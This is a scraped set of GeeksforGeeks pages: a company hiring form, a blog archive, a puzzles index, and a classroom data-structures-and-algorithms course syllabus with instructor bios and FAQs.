Hire With Us - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Hire Smart | Hire with GeeksforGeeks GeeksforGeeks has built a gigantic network of geeks from all over the globe, through various online and offline courses. We are offering IT companies to hire talented engineers with us at no cost of acquisition. Kindly fill up this form, our team will get in touch with you regarding the same.NOTE: PLEASE PREFER TO USE YOUR COMPANY EMAIL ID FOR FAST RESPONSE. PLEASE DO NOT FILL THIS FORM IF YOU ARE LOOKING FOR JOBS. * Required Your response has been recorded. Submit another response. Email address * Full Name * Phone Number * Company Name * Designation * Submit room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

GBlog Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Socket Programming in C/C++GET and POST requests using PythonTop 10 Projects For Beginners To Practice HTML and CSS SkillsFast I/O for Competitive ProgrammingOOPs | Object Oriented DesignDifferences between Procedural and Object Oriented ProgrammingWorking with csv files in PythonSupervised and Unsupervised learningXML parsing in PythonGet Your Dream Job With Amazon SDE Test SeriesTypes of Software TestingDifference between FAT32, exFAT, and NTFS File SystemWorking with PDF files in PythonHow to overcome Time Limit Exceed(TLE)?Web 1.0, Web 2.0 and Web 3.0 with their differenceHow Content Writing at GeeksforGeeks works?Twitter Sentiment Analysis using PythonGATE CS 2021 (Revised) SyllabusTechnical Scripter Event 2020 By GeeksforGeeksGetting started with Machine LearningFrontend vs BackendWhat happens when we turn on computer?7 Best Coding Challenge Websites in 2020Socket Programming in C/C++: Handling multiple clients on server without multi threadingImplementing Web Scraping in Python with BeautifulSoupIntroduction to Hill Climbing | Artificial IntelligenceHow to include graphics.h in CodeBlocks?Writing a Windows batch scriptRegression and Classification | Supervised Machine LearningHow can one become good at Data structures and Algorithms easily? Category Archives: GBlog 10 Applications of IoT in Creating Smart Cities Last Updated: 19-12-2020 For most of the people reading this article, chances are that you live in a city. In fact, more than 55% of all the people… Read More » GBlogIoT How Does Netflix Use Machine Learning? Last Updated: 19-12-2020 What do you do when you want to watch the latest movies or series? Chances are you open Netflix of course! Whether you want to… Read More » GBlogMachine Learning 7 Key Tips to Crack the GATE Exam in First Attempt Last Updated: 18-12-2020 Graduate Aptitude Test in Engineering (GATE) is one of the most competitive and toughest exams across the nation. Every year nearly 10 lakh students appear… Read More » GATE CSGBlog 7 Progressive Web App Development Frameworks to Know in 2021 Last Updated: 18-12-2020 Ever since smartphones came into existence and the popularity of websites increased, merging the two to create a phenomenal experience for the customers has been… Read More » GBlogGblog-2021 Industrial Robots Last Updated: 21-12-2020 Prerequisite – Robotics Industrial robots are those robots which were created by programming the mechanical devices which in future can be used in the place… Read More » GBlog Start Your Preparation for Wipro Elite NTH 2021 NOW! Last Updated: 18-12-2020 Everyone needs to know that WIPRO is back with its much-awaited hiring initiative – Elite National Talent Hunt Contest for the year 2021. It is… Read More » GBlogGblog-2021GFG-Course Need of Package Managers in Developer’s Life Last Updated: 18-12-2020 3 Ever Since Mankind started to program things, they started distributing them to various firms, individuals, etc. One had to install software on its own using… Read More » GBlogTechnical ScripterTechnical Scripter 2020 Why Java Language is Slower Than CPP for Competitive Programming? Last Updated: 18-12-2020 4 Choosing the appropriate language while starting competitive programming is the most important factor. Generally, we choose that language that has short syntax and executes very… Read More » C++Competitive ProgrammingGBlogJavaTechnical ScripterTechnical Scripter 2020 7 Most In-Demand and Well-Paying Career Options For 2021 Last Updated: 18-12-2020 Everyone knows how the year 2020 has led to various uncertainties in the job market, due to the global pandemic situation. Companies have downsized their… Read More » GBlogGblog-2021 100 Days of Code – A Complete Guide For Beginners and Experienced Last Updated: 18-12-2020 3.3 Do you want to become a successful software developer and dreaming about getting into the big tech companies? Are you someone who is already working… Read More » GBlog 10 Best Artificial Intelligence Project Ideas To Kick-Start Your Career Last Updated: 18-12-2020 It is quite known to everyone how Artificial Intelligence and Machine Learning are dominating the tech world in the present-day scenario. And you might be… Read More » GBlogMachine LearningArtificial Intelligence Technical Documentation – Types, Required Skills, Challenges Last Updated: 18-12-2020 Technical Documentation in the Software Industry – Unlike different types of writing, the mantra of generating a technical document is reusability. Although the core context… Read More » GBlog 5 Reasons Why Enterprise Level Brands Should Invest in Augmented Reality Apps Last Updated: 18-12-2020 In the midst of the pandemic, it’s getting increasingly challenging to keep businesses up and running. However, advancements in app development are offering a growing… Read More » GBlog 7 Skills Needed to Become a Business Intelligence Analyst Last Updated: 16-12-2020 What is the need of the hour for businesses these days? You guessed it right, it’s business intelligence! BI is one of the fundamental components… Read More » GBlogArtificial Intelligence 7 Future Technologies That Can Change The World Last Updated: 15-12-2020 Did you imagine 20 years ago that there would be robots that could talk to you, or cars that could drive themselves, or household devices… Read More » GBlog Page 1 of 12012345...102030...»Last » Most popular in GBlog 100 Days of Code - A Complete Guide For Beginners and ExperiencedWhy Java Language is Slower Than CPP for Competitive Programming?Virtualization | A Machine Reference ModelGenetic AlgorithmsUnderfitting and Overfitting in Machine Learning Most Visited in GBlog Top 5 IDEs for C++ That You Should Try OnceVirtualization In Cloud Computing and TypesTop 10 System Design Interview Questions and AnswersEthical Issues in Information Technology (IT)Difference between Structured, Semi-structured and Unstructured data room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Puzzles - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Puzzles Recent Puzzles! Puzzles C Puzzles C++ Puzzles Puzzles : Puzzle 1 | Measure 45 minutes using two identical wires Puzzle 2 | (Find ages of daughters) Puzzle 3 | (Calculate total distance travelled by bee) Puzzle 4 | (Pay an employee using a 7 units gold rod) Puzzle 5 | (Finding the poisoned wine) Puzzle 6 | (Monty Hall problem) Puzzle 7 | (3 Bulbs and 3 Switches) Puzzle 8 | (Find the Jar with contaminated pills) Puzzle 9 | (Find the fastest 3 horses) Puzzle 10 | (A Man with Medical Condition and 2 Pills) Puzzle 11 | (1000 Coins and 10 Bags) Puzzle 12 | (Maximize probability of White Ball) Puzzle 13 | (100 Prisoners with Red/Black Hats) Puzzle 14 | (Strategy for a 2 Player Coin Game) Puzzle 15 | (Camel and Banana Puzzle) Puzzle 16 | (100 Doors) Puzzle 17 | (Ratio of Boys and Girls in a Country where people want only boys) Puzzle 18 | (Torch and Bridge) Puzzle 19 | (Poison and Rat) Puzzle 20 | (5 Pirates and 100 Gold Coins) Puzzle 21 | (3 Ants and Triangle) Puzzle 22 | (Maximum Chocolates) Puzzle 23 | (Days of month using 2 dice) Puzzle 24 | (10 Coins Puzzle) Puzzle 25 | (Chessboard and dominos) Puzzle 26 | (Know Average Salary without Disclosing Individual Salaries) Puzzle 27 | (Hourglasses Puzzle) Puzzle 28 | (Newspaper Puzzle) Puzzle 29 | (Car Wheel Puzzle) Puzzle 30 | (Last Palindrome Date Before 10/02/2001) Puzzle 31 | (Minimum cut Puzzle) Puzzle 32| (Completion of Task) Puzzle 33 | ( Rs 500 Note Puzzle ) Puzzle 34 | (Prisoner and Policeman Puzzle) Puzzle | Set 35 (2 Eggs and 100 Floors) Puzzle 36 | (Matchstick Puzzle) Puzzle 37 | (Maximum run in cricket) Puzzle 38 | (Tic Tac Toe Puzzle) Puzzle 39 | (100 coins puzzle) Puzzle 40 | (Find missing Row in Excel) Puzzle 41 | (Guess Color of Hat) Puzzle 42 | (Placing the numbers) Puzzle 43 | Muddy Heads Puzzle 44 | Girl or Boy More >> C Puzzles : C Program to print numbers from 1 to N without using semicolon To find sum of two numbers without using any operator How will you show memory representation of C variables Condition To Print “HelloWord” Change/add only one character and print ‘*’ exactly 20 times How can we sum the digits of a given number in single statement What is the best way in C to convert a number to a string Calculate Log n in one line Print “Even” or “Odd” without using conditional statement How will you print numbers from 1 to 100 without using loop How can we sum the digits of a given number in single statement Write a C program to print “Geeks for Geeks” without using a semicolon Write a one line C function to round floating point numbers Implement Your Own sizeof How to count set bits in a floating point number in C How to change the output of printf() in main() How to find length of a string without string.h and loop in C Implement your own itoa() Write a C program that does not terminate when Ctrl+C is pressed How to measure time taken by a function in C Print a long int in C using putchar() only Convert a floating point number to string in C How to write a running C code without main() Write your own memcpy() and memmove() More >> C++ Puzzles : Can we call an undeclared function in C++ Can we access global variable if there is a local variable with same name Can we use function on left side of an expression in C and C++ Can we access private data members of a class without using a member or a friend function How to make a C++ class whose objects can only be dynamically allocated How to print “GeeksforGeeks” with empty main() in C++ Print 1 to 100 in C++, without loop and recursion How to restrict dynamic allocation of objects in C++ How can we sum the digits of a given number in single statement Write a URL in a C++ program A creative C++ program to Zoom digits of an integer How to swap two variables in one line in C/C++, Python and Java C/C++ program to shutdown a system More >> Quick Links : ‘Practice Problems’ on Puzzles If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Course | Geeks Classes Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit Geeks Classes Classroom Program in Noida An interview centric classroom program focused on DSA to enhance your coding & problem-solving skills for product-based companies Students, Working Professionals Sorry ! There Are No Active Batches Course Features Doubt Solving Team (TA's) Internship Opportunities at GeeksforGeeks Course completion certificate Complementary access to course content of the DSA Self Paced Course worth INR 5999 Premium Lecture videos by Mr. Sandeep Jain Specialized topic-based content Weekly Assessment Tests & Practice Tracks Goodies for Tracks & contests toppers 7 Days Active doubt solving portal Course Content, video & practice tracks come with lifetime validity Course Overview An extensive classroom program to build and enhance Data Structures and Algorithm concepts, mentored by Sandeep Jain (Founder & CEO, GeeksforGeeks). He has 7 years of teaching experience and 6 years of industry experience. The course is designed to improve your Problem-solving skill and Coding skill by enhancing your understanding of Data Structures & Algorithms. The primary goal of this course is to help you in the preparation for the Coding interviews of companies like Amazon, Microsoft, Uber, etc Classes are scheduled in Noida.Course is focused on practicing coding questions in the class itself Recommended for : Pre-Final/Final year students preparing for the Placement drives Employee looking for a job change. What You Will Learn All important concepts of Data Structures & Algorithms Enhance Problem Solving & Coding Skill for the Product- based tech hirings Problem-solving approach for the Puzzle based questions Course Content Week 1 Analysis of Algorithm Background analysis through a Program and its functions. Asymptotic Notations Best, Average and Worst case explanation through a program. Arrays Introduction and Advantages Types of Arrays Fixed-sized array Dynamic-sized array Operations on Arrays Searching Insertions Deletion Arrays vs other DS Reversing - Explanation with complexity Problems Left Rotation of the array by 1 Left Rotation of the array by D places Leaders in an Array Maximum Difference Problem Stock Buy and Sell Problem Trapping Rainwater Problem Maximum subarray sum Longest even-odd subarray Maximum Circular sum subarray. Majority Element Sliding Window Technique Prefix sum technique etc. Basic Recursion Week 2 Basic Bit Manipulation Bitwise Operators in C++ Operation of AND, OR, XOR operators Operation of Left Shift, Right Shift and Bitwise Not Bitwise Operators in Java Operation of AND, OR Operation of Bitwise Not, Left Shift Operation of Right Shift and unsigned Right Shift Problem: Check Kth bit is set or not Method 1: Using the left Shift. Method 2: Using the right shift Problem: Count Set Bits Method 1: Simple method Method 2: Brian and Kerningham Algorithm Method 3: Using Lookup Table Problem: To check whether a number is a power of 2 or not Problem: Odd occurrences in an array. Problem: Two numbers having odd occurrences in an array. Problem: Generate power set using bitwise operators. Hashing Introduction and Time complexity analysis Application of Hashing Discussion on Direct Address Table Working and examples on various Hash Functions Introduction and Various techniques on Collision Handling Chaining and its implementation Open Addressing and its Implementation Chaining V/S Open Addressing Double Hashing C++ Unordered Set Unordered Map Java HashSet HashMap Problems Count Distinct Elements Count of the frequency of array elements The intersection of two arrays Union of two unsorted arrays Pair with given sum in an unsorted array Subarray with zero-sum Subarray with given sum Longest subarray with a given sum Longest subarray with an equal number of 0’s and 1’s Longest common span with the same sum in a binary array Longest Consecutive Subsequence Count Distinct elements in every window Week 3 Strings Discussion of String DS Problems Given a string, check if they are an anagram of each other. Given a string, find the leftmost character that repeats. Given a string, find the leftmost character that does not repeat. ​Given a string, find the lexicographic rank of it in O(n) time. Implementation of the previously discussed lexicographic rank problem. Given a text string and a pattern string, find if a permutation of the pattern exists in the text. Given two strings, check if they are rotations of each other or not. Various Pattern Searching Algorithms. Linked Lists Introduction Implementation in CPP Implementation in Java Comparison with Array DS Doubly Linked List Circular Linked List Loop Problems Detecting Loops Detecting loops using Floyd cycle detection Week 4 Linked List Problem: Middle of Linked List Nth node from the end of linked list Deleting a Node without accessing Head pointer of Linked List An iterative method to Reverse a linked list Recursive method to reverse a linked list Segregating even-odd nodes of linked list The intersection of two linked list Pairwise swap nodes of linked list Clone a linked list using a random pointer LRU Cache Design Stacks Understanding the Stack data structure Applications of Stack Implementation of Stack in Array and Linked List In C++ In Java Problem: Balanced Parenthesis Two stacks in an array K Stacks in an array Stock span problem with variations Previous Greater Element Next Greater Element Largest Rectangular Area in a Histogram Queues Introduction and Application Implementation of the queue using array and LinkedList In C++ STL In Java Stack using queue Problem: Reversing a Queue Generate numbers with given digits Maximums of all subarrays of size k Week 5 Binary Tree Introduction Tree Application Binary Tree Tree Traversal Implementation of: Inorder Traversal Preorder Traversal Postorder Traversal Level Order Traversal (Line by Line) Tree Traversal in Spiral Form Problems: Size of Binary Tree Maximum in Binary Tree Height of Binary Tree Print Nodes at K distance Print Left View of Binary Tree Children Sum Property Check for Balanced Binary Tree Maximum Width of Binary Tree Convert Binary Tree to Doubly Linked List Construct Binary Tree from Inorder and Preorder The diameter of a Binary Tree LCA problem with an efficient solution Binary Search Tree Background, Introduction and Application Implementation of Search in BST In CPP In Java Insertion in BST In CPP In Java Deletion in BST In CPP In Java Floor in BST In CPP In Java Self Balancing BST AVL Tree Red Black Tree Set in C++ STL Map in C++ STL TreeSet in java TreeMap in Java Problems: The ceiling of a key in BST Ceiling on the left side in an array Find Kth Smallest in BST Check for BST Fix BST with Two Nodes Swapped Pair Sum with given BST Vertical Sum in a Binary Tree Vertical Traversal of Binary Tree Top View of Binary Tree Bottom View of Binary Tree Week 6 Heaps Introduction & Implementation Binary Heap Insertion Heapify and Extract Decrease Key, Delete and Build Heap Heap Sort Priority Queue in C++ PriorityQueue in Java Problems: Sort K-Sorted Array Buy Maximum Items with Given Sum K Largest Elements Merge K Sorted Arrays Median of a Stream Graph Algorithms Introduction to Graph Graph Representation Adjacency Matrix Adjacency List in CPP and Java Adjacency Matrix VS List Breadth-First Search Applications Depth First Search Applications Week 7 Graph Algorithms Problems: Shortest Path in an Unweighted Graph Number of Islands Snake-Ladder Detecting Cycle In the Undirected Graph In the Directed Graph Topological Sorting Kahn's BFS Based Algorithm DFS Based Algorithm Shortest Path in Directed Acyclic Graph Greedy Algorithms Introduction Activity Selection Problem Fractional Knapsack Job Sequencing Problem Week 8 Dynamic Programming Introduction Dynamic Programming Memoization Tabulation Problems: Longest Common Subsequence Coin Change Count Combinations Edit Distance Problem Naive Approach DP Approach Longest Increasing Subsequence Problem Naive Approach Efficient Approach Maximum Cuts Minimum coins to make a value Minimum Jumps to reach at the end 0-1 knapsack problem Naive Approach Efficient Approach Optimal Strategy for a Game Variation of Longest Common Subsequence Variation of Longest Increasing Subsequence Egg Dropping Problem Week 9 Backtracking Concepts of Backtracking Rat In a Maze N Queen Problem Sudoku Problem TRIE Introduction Representation Search Insert Delete Implement a Dictionary etc. Segment Tree Introduction Construction Range Query Update Query Design Patterns introduction Resume Building Guide Show More Course Mentors Sandeep Jain (Instructor) Founder & CEO GeeksforGeeks | IIT Roorkee Alumnus An IIT Roorkee graduate, Sandeep Jain has worked with D.E. Shaw and Co for almost 3 years. As his interest in education increased, he worked as an assistant professor in JIIT Noida from 2010-15. In 2015, he started his own company specifically as a portal for computer science and now is the founder of GeeksForGeeks. He has been mentoring on the same platform since then and specializes in Data Structure and Algorithms. Shashi Bhushan Kumar (Instructor) Tech Lead & Mentor at GeeksforGeeks | Ex- Adobe, Paytm Worked with Adobe for about 2 years, Shashi Bhushan has sound knowledge of technologies like Java, Spring/Spring Boot, Hibernate, Jersey, REST APIs, Python, Django, Javascript, React Js, MySQL, DynamoDB, Redis, Kafka etc. He graduated from NIT Allahabad in 2016 and worked for Paytm as a Software Engineer for a year. He is very passionate about Competitive Programming & Problem Solving. He is currently working as a Mentor at GeeksforGeeks. FAQs Is there any number to contact for any query? You may call us on our toll-free number: 1800 123 8622 or Drop us an email at geeks.classes@geeksforgeeks.org Is this a language-specific course? Yes, the discussion forum and doubt assistance are available only for C++ & Java. What is the size of a batch? The planned batch size is 50. How can I register for the course? Click on the Signup for free button. Pay fees online. Do we have a holiday on the occasion of Holi On the Occasion of Holi, there would be a holiday on 7th & 8th March. Do We Get any Placement Assistance? We're preparing you for your interviews. And yes, We have a hiring platform where you can see the current opening & once you have completed this course you can apply for the openings. Is there any online course material available with this course? Yes, you'll get lifetime access to online data structures & algorithms course along with this course. What is the last date to make the payment? There is no last date for the payment but the seats generally fill up 10-15 days prior to the commencement of the course Is there any demo class? Please refer to this sample video for a demo class. What if I am not in the NCR region of India? You may join Geeks Classes Live. In this course, students come online and we teach in an online classroom environment. Course Registration Previous Batches Batch Date Type Register GC-16 16 May '20 to 12 July '20 Weekend Classes Registration Closed Testimonials × Geeks Classes 4.9 Close × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

How to get Technical Content Writing Internship at Geeksforgeeks.org? - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive 